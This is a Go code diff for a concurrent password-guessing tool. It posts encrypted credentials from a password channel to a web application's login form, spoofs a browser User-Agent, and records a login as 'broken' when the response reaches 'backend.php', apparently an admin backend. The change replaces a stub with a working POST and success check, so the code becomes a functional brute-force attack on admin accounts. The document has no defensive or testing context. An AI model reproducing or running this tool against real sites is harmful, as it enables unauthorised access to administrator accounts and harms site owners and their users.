@@ -9,15 +9,33 @@ import (
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
+	"strings"
 )
 
 var errSessionOver = errors.New("Session has terminated")
+var errSessionReady = errors.New("Session has started")
 
 const userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
 
-type maybeSession struct {
+type sessionError struct {
 	s   *session
 	err error
+}
+
+func newSessionError(s *session, err error) *sessionError {
+	return &sessionError{s: s, err: err}
+}
+
+func (s *sessionError) fatal() bool {
+	return s.err != errSessionReady
+}
+
+func (s *sessionError) finished() bool {
+	return s.err == errSessionOver
+}
+
+func (s *sessionError) Error() string {
+	return s.err.Error()
 }
 
 type session struct {
@@ -31,14 +49,14 @@ type session struct {
 	enc *encrypter
 	// ready is closed when the session is ready, otherwise
 	// an error is sent then the channel is closed.
-	sessions chan<- maybeSession
+	sessions chan<- error
 	// password channel generates passwords to try
 	logins <-chan login
 	// broken is the channel where sucessful logins are sent
 	broken chan<- login
 }
 
-func newSession(urls urls, sessions chan<- maybeSession, logins <-chan login, broken chan<- login) *session {
+func newSession(urls urls, sessions chan<- error, logins <-chan login, broken chan<- login) *session {
 	s := &session{
 		enc:      &encrypter{},
 		urls:     urls,
@@ -58,12 +76,26 @@ func newSession(urls urls, sessions chan<- maybeSession, logins <-chan login, br
 }
 
 func (s *session) ready() {
-	s.sessions <- maybeSession{s: s}
+	s.sessions <- newSessionError(s, errSessionReady)
 }
 
 func (s *session) fail(err error) error {
-	s.sessions <- maybeSession{err: err, s: s}
+	s.sessions <- newSessionError(s, err)
 	return err
+}
+
+func (s *session) prepareReq(req *http.Request) *http.Request {
+	// Server crashes if the User-Agent is not "known"
+	req.Header.Set("User-Agent", userAgent)
+	return req
+}
+
+func (s *session) httpPost(url string, vals *url.Values) (*http.Response, error) {
+	req, err := http.NewRequest("POST", url, strings.NewReader(vals.Encode()))
+	if err != nil {
+		return nil, err
+	}
+	return s.client.Do(s.prepareReq(req))
 }
 
 func (s *session) httpGet(url string) (*http.Response, error) {
@@ -71,13 +103,7 @@ func (s *session) httpGet(url string) (*http.Response, error) {
 	if err != nil {
 		return nil, err
 	}
-	// Server crashes if the User-Agent is not "known"
-	req.Header.Set("User-Agent", userAgent)
-	resp, err := s.client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	return resp, nil
+	return s.client.Do(s.prepareReq(req))
 }
 
 func (s *session) init() error {
@@ -129,13 +155,17 @@ func (s *session) try(l login) error {
 	// Set request specific POST values
 	s.postVals.Set("userident", data)
 	s.postVals.Set("username", l.user)
-	// Send POST
-	//fmt.Printf("%s\n", s.postVals.Encode())
-
-	// TODO: Which response on success? Modify Client to check redirects.
-
-	// This login worked, send back on the broken logins channel
-	s.broken <- l
+	// Post login form
+	resp, err := s.httpPost(s.urls.login(), &s.postVals)
+	if err != nil {
+		return err
+	}
+	fmt.Printf("%s\n", resp.Request.URL.Path)
+	// If the current location is "backend.php", we are in
+	if strings.Index(resp.Request.URL.Path, "backend.php") >= 0 {
+		// This login worked, send back on the broken logins channel
+		s.broken <- l
+	}
 	return nil
 }
 
